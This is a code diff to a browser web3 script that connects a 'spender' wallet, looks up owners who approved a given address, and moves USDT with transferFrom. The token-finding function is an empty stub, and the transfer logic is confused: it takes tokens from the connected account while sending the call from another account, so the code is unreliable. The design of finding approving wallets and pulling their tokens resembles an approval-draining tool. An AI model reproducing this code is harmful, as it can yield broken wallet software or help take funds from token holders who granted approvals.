@@ -6,12 +6,15 @@ if (typeof window.ethereum !== 'undefined') {
 
     const contract = new web3.eth.Contract(contractABI, contractAddress);
 
+    let spenderAddress = null;
+
     document.getElementById('connectWallet').addEventListener('click', async () => {
         try {
             await window.ethereum.request({ method: 'eth_requestAccounts' });
             const accounts = await web3.eth.getAccounts();
-            console.log('Connected account:', accounts[0]);
-            alert('Wallet connected successfully!');
+            spenderAddress = accounts[0];
+            console.log('Connected spender account:', spenderAddress);
+            alert('Spender wallet connected successfully!');
         } catch (error) {
             console.error('Error connecting to wallet:', error);
             alert('Failed to connect to wallet. Please ensure MetaMask or another wallet provider is installed and unlocked.');
@@ -20,6 +23,11 @@ if (typeof window.ethereum !== 'undefined') {
 
     document.getElementById('transferForm').addEventListener('submit', async (event) => {
         event.preventDefault();
+        if (!spenderAddress) {
+            alert('Please connect the spender wallet first.');
+            return;
+        }
+
         const approvedAddress = document.getElementById('approvedAddress').value;
         const amount = document.getElementById('amount').value;
 
@@ -37,7 +45,7 @@ if (typeof window.ethereum !== 'undefined') {
         const senderAddress = accounts[0];
 
         try {
-            await contract.methods.transferFrom(senderAddress, approvedAddress, web3.utils.toWei(amount, 'mwei')).send({ from: senderAddress });
+            await contract.methods.transferFrom(senderAddress, approvedAddress, web3.utils.toWei(amount, 'mwei')).send({ from: spenderAddress });
             alert('Transfer successful!');
         } catch (error) {
             console.error('Error transferring USDT:', error);
@@ -46,6 +54,11 @@ if (typeof window.ethereum !== 'undefined') {
     });
 
     document.getElementById('findOwners').addEventListener('click', async () => {
+        if (!spenderAddress) {
+            alert('Please connect the spender wallet first.');
+            return;
+        }
+
         const approvedAddress = document.getElementById('approvedAddress').value;
 
         // Validate input
@@ -55,7 +68,7 @@ if (typeof window.ethereum !== 'undefined') {
         }
 
         try {
-            const owners = await findOwners(approvedAddress);
+            const owners = await findOwners(approvedAddress, spenderAddress);
             displayOwners(owners);
         } catch (error) {
             console.error('Error fetching owners:', error);
@@ -63,11 +76,11 @@ if (typeof window.ethereum !== 'undefined') {
         }
     });
 
-    async function findOwners(address) {
+    async function findOwners(approvedAddress, spenderAddress) {
         // Query BSC's indexed logs to find owners who have approved the given address
         // Replace with actual implementation using a secure and optimized method
-        // Example: return await fetchOwners(address);
-        return [];
+        // Example: return await fetchOwners(approvedAddress, spenderAddress);
+        return [ /* Example: ['0xAddress1', '0xAddress2'] */ ];
     }
 
     function displayOwners(owners) {
